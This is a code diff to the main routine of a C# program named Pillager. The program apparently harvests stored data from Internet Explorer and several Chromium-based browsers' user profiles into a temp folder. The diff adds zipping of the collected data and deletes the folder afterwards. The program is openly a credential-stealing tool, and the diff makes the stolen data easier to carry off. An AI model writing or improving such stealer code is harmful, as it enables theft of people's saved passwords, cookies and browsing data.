@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.IO;
+using System.IO.Compression;
 using Pillager.Browsers;
 
 namespace Pillager
@@ -10,10 +11,10 @@ namespace Pillager
         static void Main(string[] args)
         {
             string savepath = Path.Combine(Path.GetTempPath(), "Pillager");
-            if (!Directory.Exists(savepath)) 
-            {
-                Directory.CreateDirectory(savepath);
-            }
+            string savezippath = savepath + ".zip";
+            if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
+            if (File.Exists(savezippath)) File.Delete(savezippath);
+            Directory.CreateDirectory(savepath);
 
             //IE
             IE.Save(savepath);
@@ -31,7 +32,7 @@ namespace Pillager
                 new List<string>() { "Chrome Beta", "Google\\Chrome Beta\\User Data\\Default" } ,
                 new List<string>() { "Chromium", "Chromium\\User Data\\Default" } ,
                 new List<string>() { "Edge", "Microsoft\\Edge\\User Data\\Default" } ,
-                new List<string>() { "Brave-Browse", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
+                new List<string>() { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data\\Default" } ,
                 new List<string>() { "QQBrowser", "Tencent\\QQBrowser\\User Data\\Default" } ,
                 new List<string>() { "SogouExplorer", "Sogou\\SogouExplorer\\User Data\\Default" } ,
                 new List<string>() { "Vivaldi", "Vivaldi\\User Data\\Default" } ,
@@ -45,6 +46,10 @@ namespace Pillager
                 Chrome chrome = new Chrome(browser[0], chromepath);
                 chrome.Save(savepath);                
             }
+
+            //ZIP
+            ZipFile.CreateFromDirectory(savepath, savezippath);
+            Directory.Delete(savepath, true);
         }
     }
 }
